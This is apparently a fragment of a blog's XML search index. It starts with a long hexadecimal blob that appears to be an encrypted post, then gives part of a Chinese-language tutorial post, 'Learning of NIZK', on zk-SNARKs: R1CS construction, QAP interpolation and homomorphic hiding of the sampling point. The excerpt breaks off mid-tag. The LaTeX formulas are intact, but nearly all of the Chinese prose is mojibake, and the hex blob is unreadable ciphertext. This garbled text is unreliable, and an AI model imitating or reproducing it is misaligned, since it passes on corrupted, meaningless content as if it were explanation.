0d422597e0dc87bb1da5c4d14cca18dc40bcc631b39ba3a0019df156c6c8df6c508b4865e1467cc38d04d11082d997a4e057972b4cae0d31d1fbff12f649db6046773e0d95e3ce7a913430a6fc9f1c4fe59c7487c41e514113f2690e6b83724d8b9d7f578d8a2002fad5f9ce590fe36a6dbd8b62b23b4f6851b91a9bb29cf50efbb7c11c66c81469d5b60f6be35834b5f104b35cee444e2d2c61bf343ccdfa018cf815b029b55a3c116b6dc69954f1fa69eaf7c8e5785ae9b47c1dd642755e09ebee015cb2f6b01cddd40c4451ac539b94c38796c17eab9f9da1a44b5a4365cf2dc1d9935d33cd106be3106165fb54d9f063f3e796ee893a6ca173aabdd41fc30db5c2ce0dfc7cfa7f540dd7406023ae931c7842c41caf9fc89908516c3ff04402fcae151ff7ed0203662b3228da428902834f78173fa973e7936efa37456b1d7047b2903fd27101e14aed61c18f0b44a1bc4441a95d7a188836339d7bb75dcb16c95a6dd2ddba43a2a905b6981c19109922c73a979e9895e30c02a2e559549b45621ce2a94bde2333685c2df565b50aa87c855752d497647e80e16612c08789ba461071c520996ad7e7bbeed1f14d603199fa8b9f336bce4b98ba94b64e1a4378a547390819b1aa562ca8767829e3aeb815e570bb48b7957e30ded9ed020a075c93de2d2b4bb48dbb445ed2b6c96a24564f062bf17e8c87bc05f296f800975e9aeb6f60e02c0c650fcdd169a9f361016b3295773ee1c338eb17088e03ced8c71d17025b46d811976d94b40d7ab805f3e3329227053d351a45e7e86533d8e592e6f07a8896920f424100aa9365e68f3f46c3ded4a12fd534fe8e904fbcf0ed85df637af7d9021945c1fbe2357cce2ffe8972e306ccdc04b0d694600558c3b11178607cfc362c568cf1a3eee290cd86c34b5803b3780a19e06456e41bede947359325e2644d218a3c2e9727ead3e9fac9ad0a612cf5125561a37f20fd7afa867ca4a47b5850799cf8ed9e7b850f854a723237689c1b7a243f4953bbe8a40980561c6d86de52bba491825806bcbf677e4a692edf06fdb853c9ad30838a29567ee8fae35a77fcd3363c99c6a763078c09afa4ae237214825cb893037ce42b759c05463d6495e294de7c31e2d641495da4a2b53ea3608048d1ad806064b699128567bd2f28d293820192bff551f3ce607d8e55be76c15fabb00897b6756b35f2c7f561ebbd62b87bd034add7fe524731f186673f0a77f579b40ebcf7d7165b8ee4f3fc9dee7f48c7bd02a84aa7fd1e6c528d7546816ac0980e13749a79aff66677e22dc1ebe1195b2c70602a5399c2b97ff02387cdc69395ee6edad88b1ef478d9e381a7347bcffd90c6492639d1ceef06b41bcc6520dca3a3641346d455b7d6e7229cc718aaf1da75e7fa5aa7dcc7a1675fd1542b66e1fc27efee9df2f69259181ba9eee9e044440dbfdbd6633747c287f1b61e5763ae990c47cdfaa367b6824e5a37561e1837e8502a2e4ce0527c3a1a0f91885844513ba47ad78657dff4e3fc7ebc041597bce51299c660d226a29ecf41cea03c3744b6eaa9185da1d2019cfc7a758af49f0fdeea01b99aaab0f17c5522e4c04fa0c23e074bdfab13ab4384951aa6585a0f2355194017065e19426aab1a22efa4b33bda3c17c42099cb83cedf9c2aed5eb2e4a6db334453e635a97c09a321455233a5e0d8b1be073c026bb4af7a1a74c9fa7e383600322df6a87d88f4f07813ae1ee81f7befd3911238bd2d0f03efe7768acd24e2c7b75b726bc7355c3a5e702734d84d7a85602cc38af1248750c002dd362269da8ccee5df068953da1d2c2682800b6caaced26e4ee33a744efbb082e928eb3287b9844c2c55082497f16ecf31d8599dd63474992d6784f06dc6dd292017c546634b4a8f7eaa1e8a52cef6e7dd4d59a44fea1a6aed5e65485adafa2b5f55c486d565b0ce5c1067773ad803c0e3257883eccf4c0cda927bda25a3ba3cb41a6cd324f7da224eefd1bbc92e1df74e21ac8765130fdf4162181caa2e0b2d9748acb1b76c3780b2012d6324cae8359b6056849847a747ab64ef96e3330287fbd231ac271261f843f8972409ab9037373fc98c42d439fb8dfa838533503cf66cb089dc72923e7d9e1692cc3f333092cae55f459808629ed1875942f6757bfc68d7e9a72225fb3e8adf5137fb57dbb82f21f34742728bb437d192d7b86f156fc8c71a95014c25b7470ab422a801e0c5198d14c3caec6d700a6b83cdef98f924467da14266c08109ff0d695a0276e79e74f45504289f0bf6a42d69282eb87b701c9515a0795844aec7ec79b2ef31c9d0562b800e949e936c1a7a2cc2bad70abf48ab58031417f687ec5ce91c01ad8d8c50b3ec4ad18683406a9f4e36f122cd3b97f179543c46e49d6ae4c1e1fe0a539408fbe2957c1392905e70cbbac5b9cd44ea1e72ffc64c3b55c1e489753da5b75592a6b11a09fe4111317fcf473e4d5e359f2bf9e3fcde12e7e3c3717e45acb14821cc39c3ff106ce135cc6ca140f4443b000e9da8de5c75e1fc22dcb84d6cab652be4ed9d25149cb72bdcda952a11e7325f07c691e34bc479baccdbcd2a7e786ca4c0b6cabe73777f80d368641ee700d4798a32a2b078119281766ad64e11263e7758d25abd203fbca3f6f43ca5ecb52697de65d38d7bd5bccd325a97c1c9f2f942686402b2fac5f670f257c7c61fb5a0ae43cfb1a6a5ca92c78d91dde10177492ff7c0e9ba2ffb11dff21615188e3c16c0c777e45bce8368aeb8975f3724ad0cb1b0ce78e415eefb8a41a507fef4415a180efe882b94e6f1bb5da435c98c20b8e930cf113d19cb97aa866d145db2eeadb9c6a0303e84b87cfaf17d48747e233f18b8014933a023c6a80a30d7ff4562d3805fd1fe14131f7f16e1fa648b92de8fc1f9dd73fb26cc09f69c1a182cdce8635f977f759df2ebb0b97a66b6572d7cb144bc04019702c84e4e51ddfcb761a1ceb766a59367a90a5fc2894923ba6b3e629b43870fcdd2afedfc2a6bd05a89a69a0d96f363ce2b79d09fd7b600a6a0976558ab20bf781b1644fd32ee8cca7f8c2ccdd0c3f5672176631c7dbf80bf024f10d70f36a53591d876a4394336337ae4d8db4d04cad991499411f458e894cb7f2835e40d1d74a100f005d1ea51ee5e3efc12e7b2e7b0ea3ee040be7b62aff9f24a197b7826a5d8d9949bd1ac75e2e86f377bfae02cbe9f82e9284959d50215fcded2decddebb7768fb0c7f50532a5b5255655ba73ec7fca7db2de52eb8db19819290e8ebd817d63feba37b96726fb138d56b422c019cb246f26ef532e6f7585aa70ee7fd761e455c0cdf910fb1a4bca2b8a77748dce9526c3c74054a29290e7230ef228f8c1a92feb620764a0b7b1c2fe9d46f83ed3e2b9d73c6f9fe3bda7db43382f2659c4502934d1d192c921d57717f47d811819043c98a901dd3e48503ae83b6cd2a6a187ba3230a31eff07ea2c88b47dd25ff63c03f0e7d4a3884763aaefec047e6310c7c649f960fc6af1cba8ca7b44dd49822de8ef326ff9ff25d1f5aa2a1eb272ddb2ca9a4db9cbe4f573f62bfe01fd8a910f36f88e74d916ac4e29cafa4c034495a263f6737f52bb7b53a72ceacc31c9a10a846e71a6fe3f6ff585519e84f8ee15b57fd072c4804e87d91ab74d30d45474af7d3d6a75b1efc4afbee1ab14343463c356c53deebcd4d89f56ff8d19b234caa9086ce2875793ba2450e271ceb7ca19e97533312c3733d9afa1e03ef1d3c294dac91063d66a3754380438b649b8d77eece5d1fa1d53afa49739605358b976fe8909450a0d635177b32b0c09cb0d03148961e693f6d9dba0ee88274610654fb262ab686728c8fe92995561a9e026c88a3afd2bdcfc6d81801e2190f0b9c0b8f405dc8f7eb7278047b29aedd3d6d8fd3a5b1449b01e389ccb979c0f0c4caf20c351004b8b541f6da9ca921dad3d691bea1d1942063c204f08762c7d22ccf5d34eeccda6944e75c3df63c9bdb4fe675e56ed0675f02762772b3f41b7313c987d60459c96459b7f23b01bd5e7cd04175ef05e1b85235e1014c09b8e84faafa683bb53a335ff176f63688dce2fe488070baae9b9200a7d334300c71bfae3f77b29f18d04be13cb5c21cfb05fa2a4dbd95767dc2f2a588db9fdc5ba6caa09764a29b45388a5b42b740eb7fe36348fb3397288fe93ba086cecdb8ef620f524a01d581b424406aca7abb4d3f9c95e246a050b3f3fa371e327206cc7069c89647be993527f31ec069386d72879d177f8e07cfcfab4f948fcf7dc7b3cfd32387bbd15d9cf5faeb587a4be341f369de6eca688ff59037a32e31995b48238bbbaf931069721da431b4802025ec8e79b12651b46a1f9f35225c3667eb8af24ab58aca9dc5f7e101918f378251dbf6a25abb2e33c5da2af14dbf602053fc78afbda49803bc3277b6731066eff132801be85e90bb22fb168a4ecfb00bdfe9507d1adba4438b03abc216b7936a60948d7ed4e13f9b0b97bc3983c7c6f25a11da715c913dc42902879fd5ff59de0c7ed5044ad0393c5aa33065b65c496229e053d88b9c1a04519862eaf54a475172521d3ebec4783a4371da52d11128a4eff65d04a4f9a94a7f2fab42d63441ecf3cd174eb7fd3038aa8dc55c62692e17c4a693ec635e3c47f16558785e4fbc58037a0465a66fbe8042a2af2332b05b4ea0573c13db49dbdefd24941f08065c10c3b5714bf64fd032a0a12de64c498161eb11b43d716f1d644be265003a3bfc19aecb5a472ea007dc0b754ed61a5ffc9eb109a36f821cc5fd525482d7a36693e6923c8d90afd321d70d2af68309640460c0cc609456a23287a00b6b245011d58830d92661ae308d5032f00b2e5d8bef35f9c0d77dd05322b07a82342714cb7e520cb3f6e002995db36fabd9b927f64d76143a10ee3a63a2fa677854708485b2d76a36e9cde5bb130439d9a5bca9d8506b96563d11a44ec6522f179ee68f8590df6b31d18ac7e5d9360c149943576a3afbeeacb14839093c379d15ad84de17628940c2410d64ee37a7d80b654da9987527b444c44909b59ec351eb0386045679da939b4d330f77f27197025db7a7d347fcc7885388d1288596a25aa7cb9eb55a41295dfa412a0cdc306a652e5f043edd32595fe5aa6b32291ce9d48fcfec90a44d7283cde5960f74b1f0c0dd79445d7f6388b1e623d3ffd73bf85b914fafcc1d99668e63db7f2725c182128937a371eb9deab14e952c5fe9c14eb3d8545310a1fbe4de7fa3142c53de7d82d6a629a9346fdb6d4044fe7473c0cb70ef3188d68856f904f2578c06d4237d8fefcf17d18642cd118b5c31c93f078beba0ee0911fa4d0160d3544305b483224544e87c5787277e058cdd92bbf5444e74c89d5eff30ff216ba2f6972b570d3e9dc7a61d63864cb704022c430c3574d2aef56d77a8d9c909dd22dec8775314984db42feed1ac0350306b4ac41876c0c534db98e02163fa70ea4ccfb3936d5946097bab925979dbb50871e8b61dc6d2db2c64a571157c30d6dd2fd8166c1d395724b391488c00d11dd084e5971d01622a55e4937df6de1681bcbd7cb53cea02771d758042649237d69b74b8c832f3e91cf07ce29f57ee85b178c1736fc154fbd747b409aa71f45ed8df954136cdd8ffcbd0c84192d2f48de4222b1f0863e803a1e77b6fff03aa8c8cd06c4c07b1c32352aceb73bed77bd2b2934134471ebab9cf102b2da08b1eb98b92cb56c77f0e316338f6b96dc1440fed84bdc2e03eaba6ef09acd0954461f42326c3f85b8bde4f66f0029905f572b07d2b6617ebd126d404d7dfb0ed2ac3b0c4674d221a9617fbe7cc0e4a2c2b2549cb3d545457bccdf154e5f9251967887ea2e75335433b4cc748d7778012e1418f20562b8969f934fde500b2334b9e937912ef2680214d75a5d14f05e4751ea8ab8f74eb9805081328407b7cc343ccc3b60abc6cdbc1c140fade6bfa7f356e073fb78a27a3c16cafc9bceb50ee7bb21f4eacf68332c33da590157f98d07f64eb45a9acf8596ebd0496b4c166a39fd452223f0be3c6af830270933f48f4e4aa6e555d21a1240f89c59e9c8e579a55cace3e41acd72a7ec726c57c31953e9bc367c6369d681b11c16855388aa7452f93d6cb9f41efedb031c10ff95577857ce901d9177a9a4db56e8bff3050d6b05e09f288f7fb9de229d5b9a51586af02953341a42a2a6e3bf00a803606d4647fd047dd0b554a08d4e3cb73b94e1fbcdc3a793e9b7a3b1961fd47ea1ea8e82355f402da81e1fc49ab2ca9299d4e1f1c1af477523b2d795e77d487e8fee8eef79726a965ac23998943f5a1a90cfc56711edd14a703c575ebceef4d5c1abef22ba52177c370da22eb9d00c6662fd0ee7fd5ee39ed78a13190819a9920dbabb4f72995e2c6f16f42a70cca207a1182d6fab37380345ce752ce229c1db24d14a4dc8924c00bb1adc78a7b32730732c0ff9afa3dca605b04219b5efca30489294d843924cc207273aea609414b2224f376950bf8bc38510fc91c68965b0ac10af12fe6d31b4fc4a1f40af035934a100ec9985f16742df0788994fbde046b268b1f78de542604c6445f820d6bc98402cd79dcc0122f007e0c0d3d29adbb129b986e510f8625e6574bd2155f1e01f216a9bdccb6078bff4562ae4fd32da9609abb5b42215d6f8439c6d65da1a97872a3df6c0cdc89d4c4be4bd7e79d5c01c1ddba7b1da6b3bc5a0dcfdebaf444c290e8fe3c0671a8fee5f989d187f7b1ec2ac33d5b3a83d2a976c35f4def0f8c41468cc298fc5d0aca42c3be674437862e4b1e2b84af1bc10a6d74ea9ca1ab00bb3a54e333091fcbfd95b028bac8c39143122ef56f3298c47629f0f8a7ea23b9ff1b3ce2f55639e2e362d04d72fda555be71055686ca51e36ea9281224f5b606f2a91ab9333ee77d19c5cd1f87a90dd2db80bb062da10b971bf17f3129f56968a8183207cff33d53ff188003c88b7f0e2abb7f398ef6442fbca3205902bdcf5fef962d071bad935149f004eae20ca372c0c80ce824357627166bb18211cc4d141807d74b5878d1864195d31eec2a6486d385b9d7851615ebed6447db249848fc33bb89f31ec32109a73efb9c726fd9fec0f7e3afe795afa398097aaf02f34646662a1cf44aa88e062494920c4efa79543b1865f920741367b5f86f7ef3e3ae9f02bc046c22dd4d9b011ade6b53fc0cec5c5b1f9e7dbc59ce39a3503996ca74b20c612abfb31eef8284e2a3f72a32e6a66ada4046b40fe6c9b2bc81a7ea58cd92df52b42249b0cabeec142ec141d059502e5d04e16c9d66f6e5dc0e0506eaec0d115b2bd1f010a3a64cc63a205b220af3e41ee355baf033d71c34a888b38f4f5dfc9a897484c53ff25e5934bcd05310f3e283a64fc24300958965ad8ebc024b936e7a0f2adac4bc2ca674640a8bd8b4975d7ab60248a33a8abc3e49d5097e5c04392126cba4501eea860daefa70e01cdc3b76dc8572f10a9ff18ae6622fe05a2348ced97186aa6c466a8a99f7c9eb81f271ea5e1403d9c30bded2c4498c60ff7725fdf1b2b06eadae103cc065a470e6d0f7abd2a061c866ffad29c70048aca85316b19f161b6bf31a08c1a6bcb7821168a6eeea88fd249de4e2c911d3be71f75c34a03af3cf6b1b13de92df3a3ce6b3573f1c541e4448208e638cfb5efaf2abbd91fd9079f26e776b0c70ac7ba2935069dc0d8f0657d4751bd84d0f37b98ed59c2af7da1155645b051ddc255abcc31359e28d9f94ea85863d17748673f509f32ada216ad19c26fb42adf6526a1034f2d3c166ed9b026131d14f72a0deb7753d282cf348a2b8f27f1a8e2042d37fcf23e5c391a8d9e5a746d3a6d28f2dad1a9bcc967af13eaf723d2694523a449e39a699585424da2e38794624a8c1096694069cca424715e5837364a65cec7633761807e8b5694cee5f7ad57fbcf3f7f80b18b008558895bd57f3010d5c88d8475d50f84aac3e0d214072fa692cd8c4a1c807336d537227d764b8ed024f8fce3aedcfd7a662420ece54dda6fe086a6c4f3d0f0b79e765e7342b99d731dbe5c36e1d4a51543eaef61afbbcc839dccc440f77aaa07b9822591471d3ebb4907d8394457fae2fbe8da00ee03803fd4d949295909870f326e05e617f172b36e384d800325bc45e07072b5bcc2e50c9ab07257640f2e2b5c383832db01e24904ee776e8e14a0404066da80a330eaeca3810511b5afde9d6903862bad8f7093ca48473835a44ed3ff765f043a00fc7034b97dbde9285002c97f2465ba07a441904f074ad985d15d1f7f23d80e0c7915056c2f6b70789c28f9fc7c72d914184910c3a48686847130f7339931ab8c9462ef0a1d26ff316a6ba8f463332f1317483e8ead2e0f7de5938997f6d15457087cb77a16678b85907845c3eb7013810164b8bfd1b63d308749863c110e38af731ff5a92b3c8d2626324ee13066b96c9eb8844a46603228278414d0fee195786c117fa661fcaaf8989b223335eb0a6f96045063a24e84fc777f9d709ee38b279866fa960b482f662c7c8b99b80ed847023005a3ec2105b09013e5b3b5ddbbf555c0ddf81c36b4a8430fd31d523b8bb1a56ed73765a6ed41b3a9a51a8042fb137924ccb070bd24ff26da11bdce72d94354ee32b79e7eb8015ed0ccebddf63bce08bb40ced4fa31cb8a8fb03374b490a8f0ff5f33d739941a23df6fd0c7832e018de0e1d384b960cf6baf0b2431202d513dcb69adebb703a2328896e31c6955bfab64988c11e604a4f95c972c6a3210e707515c2ffb67527cbeee85a1da213a3b7edaece73bd8359d690c6a502f88fe5de40072dade753ed667f97f803790653f2b580039edcc789ee8ffb6edf9fc4515ed7166b074b032932eaf6c6be489fbb463e167dd83e929d4027076e6e15b025e953b8209e8a96a2f33c2706bf6faa525170714d9faf0c12b7bf80233d2554e2736696250ffd26c20dc013cf7aa85c25bd48357bf4e9271fbd65ce2ff871a0b33fdf83e47c43a0b6e8602d40bfb4f7396b5c65ca2eb21f6634ea214f4f4c71bb3fde294f06d78992fadf56b8c6a06ba1b3dd310f4f9e13b910fbe34c5d098b53007fbb084f01dfd1c7d7f4358692eb74f6ef8ca3160a1d6ff7cb03909b40efeb108e188ebdda2c5e7ea6016da7a8947017b14fa773e6a47c2cd0ab3fec25ce0344a2f627ed849b1ef13be1ecbc26a51626b14f02cc68936da43642bbd784d239efa486ec33003f6a88c42a5736629102aac3418f098410b74880a1c7c0d7b91ec99553acd43e47ac8c364a4efa47dbec0e4ec693444771a671421505d0e45f1cac0d1aca178e5aed7f0e75b4dc5c7c51f3b033c2ab0f0ba5b9eae3408aa6bf5d4b6c4f8e5d4e23b28b2c2aabb311229072ea4aa9afd15f5d20904f6238e1cb5133466c5157a820a6c9ad2d72870429164eb5140f4fea72a179247f4981744f5ae702c3cb8a63ade0f0d7b56f9682016ba923e1747e4b148868131caa1a3552065747e94f35ace0661fe8f0b84dd3f56c2a4987761fcec9a0a36aca82107e9908318a1a958ac670228a1c47a4da5d235e76b13f005e8b4923ec47794a564a88f02716076d18e2cbcfb32d4b677f434dc3d012ef311bf40b8fc10c3f42834ceba5b9ac79a5d1e1bcff08cb1297e76eccf00b97fd6d3d4d26faaf62a0b111a6f0aa73d540eff48bffcf5a7b838672402596492f1371630b359cc2fd1cc274c5b80d7b8eb7c26624c2fe1cb14eaffd84e1875d0bb13ba44533de688b0c061cfa1dd6f12e8e124e4f99e44683decd02d0ada87917660c456b567840b0fa5a986374fd5dd21d99875944dcedd516e190f7837be3f1eb0a8e6eaf8331b3b0add70e5c5af9ab69f8e870aea3a0fa21bf663b87787cd2921be16e4d3980264afe6354e8c92fa8d2e4f3763878708263a4eb2f424a054c97a1f7cd33feccf82f888841e589d4cccd293d0cc3ac5e04dab24a729dccdca92c8e03452f9cb43fee1b89d09f5cee9daf451b27de66950475e74bf8fea9b0da32723345f9eaf9d1375ce90e5602173f17a58038da0567dbbc41a1cce91e8c33797d3fac204e31a23d3bb47e32a13990dbe61babaf800761ed036f381918a5d5ced269582fda4f6c6b2a57c512665288ba660cb171a5c7000d833daa379abf5489de346cd134b8ef266b4e5d073726ed8bc805bf9060b7d1d20fcf55405755f8e8cfe337911d7934ee0c3eec2b4cac47f6b1ae111b90ef569848117eaff1ba4b174475f02d15c9f8d8d94c0c29e8738b08579191959407373d92aadebb0dbd0ddb8de2e63ae463808e3fd714b8ef823a2b97b5f192429057758a3429807195de56a0243a97e6e866455c046a3a957514a0883debd636ed1e1b7152afca2dbc7b023396e7499f9f31386a22f09afed2bf7a0c0e8f5b2de4a67840decee974279d2af129e652e01eea74a78395da2f094c5b26aee60779dde1a9d06cde1ec2ff137da2c9176ccdf7eeed14283ba56bd0c78a2eefc1f2ba0be67eee4ed63e21dfe2ccf1524c21aa42153b6a5aa49632d78ac696e2be41fd4f0ff4064095dc9b58e74c799909706595414bf15b1c2efcea82fc2d4eaf2314102948f9645556209d42f812ee91c85d65d160f0db5ff2d08c73b4daf557ffab3bd8b794718c380375387a76ebac6210632d8a88500d1fb3f642b3cf554569f8524d692d763a2d49ad1653eb827490e867c08ba2a78001f957ef9f1dfffee92e9d43a13cbd9dd84f98441057527253872f937d56d5a1ee8636e642ccf1f241b0553fcce3fbd6ea19a61b78c4c58599466d89f6c2a488dcf20c103a5627388efc9b15592498880715ec279a791ecdce9e7e5fc8327c066d390054cbf24586605a10b2df0590a13f9449e6005d96e988d96a191a4cc48</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Learning of NIZK</title>
      <link href="/2020/10/26/Learning-of-NIZK/"/>
      <url>/2020/10/26/Learning-of-NIZK/</url>
      
        <content type="html"><![CDATA[<h3 id="R1CS-of-zk-SNARKS"><a href="#R1CS-of-zk-SNARKS" class="headerlink" title="R1CS of zk-SNARKS"></a>R1CS of zk-SNARKS</h3><p>éœ€æå‰å°†å¾…è¯æ˜çš„å‘½é¢˜è¡¨è¾¾ä¸º R1CS (Rank One Constraint System)</p><p>e.g. ç»™å®šç­‰å¼$x_{1}^{2}x_{2}+x_{1}+1=22\ (x_{1}=3,x_{2}=2)$ï¼Œå°†å…¶åŒ–ç®€å¦‚ä¸‹ï¼ˆå•å…ƒä»…åŒ…å«åŠ /å‡/ä¹˜ï¼‰</p><p>$y=x_{1}+1\quad\leftarrow(1)$<br>$z=x_{1}\cdot x_{1}\quad\leftarrow(2)$<br>$u=z\cdot x_{2}\quad\leftarrow(3)$<br>$v=u+y\quad\leftarrow(4)$</p><p>ä»¤è§£å‘é‡$s=(const,x_{1},x_{2},y,z,u,v)=(1,3,2,4,9,18,22)$</p><p>$\langle s,a\rangle\cdot\langle s,b\rangle=\langle s,c\rangle$</p><p>for (1), $a=(1,1,0,0,0,0,0),b=(1,0,0,0,0,0,0),c=(0,0,0,1,0,0,0)$</p><p>for (2), $a=(0,1,0,0,0,0,0),b=(0,1,0,0,0,0,0),c=(0,0,0,0,1,0,0)$</p><p>for (3), $a=(0,0,0,0,1,0,0),b=(0,0,1,0,0,0,0),c=(0,0,0,0,0,1,0)$</p><p>for (4), $a=(0,0,0,1,0,1,0),b=(1,0,0,0,0,0,0),c=(0,0,0,0,0,0,1)$</p><p>ä»ä¸Šè¿°å‘é‡æ‰©å±•åˆ°çŸ©é˜µ$A,B,C$</p><script type="math/tex; mode=display">A=\left[\begin{matrix}1,1,0,0,0,0,0\\0,1,0,0,0,0,0\\0,0,0,0,1,0,0\\0,0,0,1,0,1,0\end{matrix}\right],B=\left[\begin{matrix}1,0,0,0,0,0,0\\0,1,0,0,0,0,0\\0,0,1,0,0,0,0\\1,0,0,0,0,0,0\end{matrix}\right],C=\left[\begin{matrix}0,0,0,1,0,0,0\\0,0,0,0,1,0,0\\0,0,0,0,0,1,0\\0,0,0,0,0,0,1\end{matrix}\right].</script><p>$m=A\cdot s^{T},n=B\cdot s^{T},p=C\cdot s^{T}$</p><p>for i in range(4), $m_{i}\cdot n_{i}=p_{i}$.</p><p>å¯¹A,B,CçŸ©é˜µä½œå‹ç¼© =&gt; å¤šé¡¹å¼å‘é‡$(A_1,A_2,A_3,A_4,A_5,A_6,A_7)$</p><p>å³æ¯åˆ—ä½œæ‹‰æ ¼æœ—æ—¥æ’å€¼ï¼Œe.g.</p><p>Matrix Açš„col2 (1,1,0,0)ï¼Œè§†ä½œå¤šé¡¹å¼$A_2(x)$ç»è¿‡ç‚¹(1,1),(2,1),(3,0),(4,0)</p><p>åˆ™$A_{2}(x)=1\cdot\frac{(x-2)(x-3)(x-4)}{(1-2)(1-3)(1-4)}+1\cdot\frac{(x-1)(x-3)(x-4)}{(2-1)(2-3)(2-4)}+0\cdot\frac{(x-1)(x-2)(x-4)}{(3-1)(3-2)(3-4)}+0\cdot\frac{(x-1)(x-2)(x-3)}{(4-1)(4-2)(4-3)}$</p><p>$s\cdot A(x)*s\cdot B(x)-s\cdot C(x)=H(x)Z(x)$, å…¶ä¸­$Z(x)=(x-1)(x-2)(x-3)(x-4)$</p><p>å³è¡¨ç¤ºxå–1,2,3,4æ—¶ï¼Œå·¦å¼å¾—åˆ°çš„å¤šé¡¹å¼å–å€¼ä¸º0</p><h3 id="zk-SNARKS"><a href="#zk-SNARKS" class="headerlink" title="zk-SNARKS"></a>zk-SNARKS</h3><p>å‡è®¾Aliceå·²çŸ¥$x_{1}^{2}x_{2}+x_{1}+1=22$çš„è§£ï¼Œè¦å‘Bobè¯æ˜å…¶æŒæœ‰è§£ï¼Œä½†ä¸èƒ½ç›´æ¥å…¬å¼€è§£ï¼ˆé›¶çŸ¥è¯†è¯æ˜ï¼‰</p><p>Bobéšæœºé€‰å–ç‚¹tï¼Œè¯¥æŠ½æ ·ç‚¹çš„å€¼ä¸èƒ½è®©Aliceè·çŸ¥ï¼Œä½†éœ€è¦Aliceç»™å‡ºP(t), H(t)ï¼Œä¾›Bobæ ¡éªŒæ˜¯å¦æ»¡è¶³P(t)=H(t)Z(t)</p><h4 id="åˆ©ç”¨åŠ æ³•åŒæ€éšè—æŠ½æ ·ç‚¹"><a href="#åˆ©ç”¨åŠ æ³•åŒæ€éšè—æŠ½æ ·ç‚¹" class="headerlink" title="åˆ©ç”¨åŠ æ³•åŒæ€éšè—æŠ½æ ·ç‚¹"></a>åˆ©ç”¨åŠ æ³•åŒæ€éšè—æŠ½æ ·ç‚¹</h4><p>Bobä¸ç›´æ¥å‘é€æŠ½æ ·ç‚¹tçš„å€¼ï¼Œè€Œæ˜¯é€šè¿‡åŒæ€è¿ç®—E(Aliceæ— æ³•å¤åˆ»)</p><p>å‘é€tçš„ä¸€ç³»åˆ—æŒ‡æ•°æ˜ å°„$E(t^{0}),E(t^{1}),E(t^{2}),â€¦$ï¼ŒAliceåˆ©ç”¨è¿™äº›å€¼è®¡ç®—E(P(t))ï¼ŒE(H(t))å¹¶ä¾›BobéªŒè¯</p><p>Bobè®¡ç®—Z(t)åæ˜ å°„è‡³E(Z(t))ï¼ŒéªŒè¯E(P(t)) ?= $E(E^{-1}(E(H(t)))Z(t))$</p><p>ä½†ä»å­˜åœ¨é—®é¢˜ï¼Œ</p><p>Aliceå¯ä»¥è‡ªç”ŸæˆAâ€™(x),Bâ€™(x),Câ€™(x)ï¼Œå…¶sâ€™æ»¡è¶³sâ€™Aâ€™(x)*sâ€™Bâ€™(x)-sâ€™Câ€™(x)=Hâ€™(n)Z(n)ï¼Œåˆ™ä¹Ÿèƒ½ç»•è¿‡éªŒè¯</p><p>å› æ­¤ä»¤ï¼Œ</p><script type="math/tex; mode=display">A(x)=s\cdot A(x)=\sum s_{i}A_{i}(x)\\B(x)=s\cdot B(x)=\sum s_{i}B_{i}(x)\\C(x)=s\cdot C(x)=\sum s_{i}C_{i}(x)</script><p>åˆ™QAPè½¬åŒ–ä¸º$A(x)<em>B(x)-C(x)?=H(x)</em>Z(x)$</p><p>Bobå‘é€Mä¸ªäºŒå…ƒå¯¹ï¼Œ$(E(A_{1}(t)),E(\alpha_{a}A_{1}(t))),(E(A_{2}(t)),E(\alpha_{a}A_{2}(t))),â€¦(E(A_{M}(t)),E(\alpha_{a}A_{M}(t)))$</p><p>(å…¶ä¸­$\alpha_{a}$æ˜¯Bobç”Ÿæˆçš„éšæœºæ•°ï¼ŒMæ˜¯å¤šé¡¹å¼å‘é‡A(x)çš„ç»´åº¦)</p><p>ç”±åŠ æ³•åŒæ€ï¼Œæœ‰$E(\alpha_{a}A_{i}(t))=\alpha_{a}E(A_{i}(t))$</p><p>Aliceé€šè¿‡è®¡ç®—$\sum s_{i}E(A_{i}(t))$å¾—åˆ°$E(A(t))$ï¼Œå¹¶ç±»ä¼¼å¾—åˆ°$E(\alpha_{a}A(t))$</p><p>ç±»ä¼¼çš„è¦æ±‚Aliceè®¡ç®—å‡ºå¯¹åº”Bå’ŒCçš„äºŒå…ƒå¯¹åï¼Œä»å­˜åœ¨é—®é¢˜ï¼Œå³<strong>æ— æ³•ç¡®å®šAliceç”¨äºçº¦æŸ$A_{i}(t),B_{i}(t),C_{i}(t)$æ‰€ç”¨çš„så‘é‡ç›¸åŒ</strong></p><p>å› æ­¤å¼•å…¥å¤šé¡¹å¼åºåˆ—L(x)ï¼Œå…¶ä¸­$L_{i}(x)=A_{i}(x)+B_{i}(x)+C_{i}(x)$</p><p>é€‰å–éšæœºæ•°$\beta$ï¼ŒBobå‘é€Mä¸ªäºŒå…ƒå¯¹ï¼Œ</p><p>$(E(L_{1}(t)),E(\beta L_{1}(t))),(E(L_{2}(t)),E(\beta L_{2}(t))),â€¦,(E(L_{M}(t)),E(\beta L_{M}(t)))$</p><p>Aliceè®¡ç®—$E(L(t))=\sum s_{i}E(L_{i}(t)),E(\beta L(t))=\sum s_{i}E(\beta L_{i}(t))$</p><p>æ ¡éªŒ$E(\beta L(t))?=\beta(E(A(t))+E(B(t))+E(C(t)))$ï¼Œï¼ˆå› ä¸ºåªæœ‰å½“çº¦æŸA,B,C,Lçš„æ‰€ç”¨å‘é‡ç›¸åŒæ—¶æ‰æˆç«‹ï¼‰</p><p>æœ€åå‘é€$E(t^{0}),E(t^{1}),E(t^{2}),â€¦$ï¼Œä¾›Aliceè®¡ç®—E(H(t))</p><p><img src= "/img/loading.gif" data-src="/2020/10/26/Learning-of-NIZK/rf5OBq87NWCjy3K.png" style="zoom: 50%;"></p><p>1) $E(\alpha_{a}A(t))?=\alpha_{a}E(A(t))$æ ¡éªŒAliceä¼ å›çš„E(A(t))æ˜¯å¦ä¸º$E(A_{i}(t))$çš„çº¿æ€§ç»„åˆï¼ŒB,Cç±»ä¼¼</p><p>2) $E(\beta L(t))?=\beta(E(A(t))+E(B(t))+E(C(t)))$æ ¡éªŒA,B,Cä¸­ä½¿ç”¨çš„ä¸ºåŒä¸€ä¸ªè§£å‘é‡s</p><p>3) $E(A(t)B(t)-C(t))?=E(H(t)Z(t))$æ ¡éªŒä½¿ç”¨çš„è§£å‘é‡sæ˜¯å¦æ­£ç¡®</p><h4 id="å®é™…æ–¹æ¡ˆ"><a href="#å®é™…æ–¹æ¡ˆ" class="headerlink" 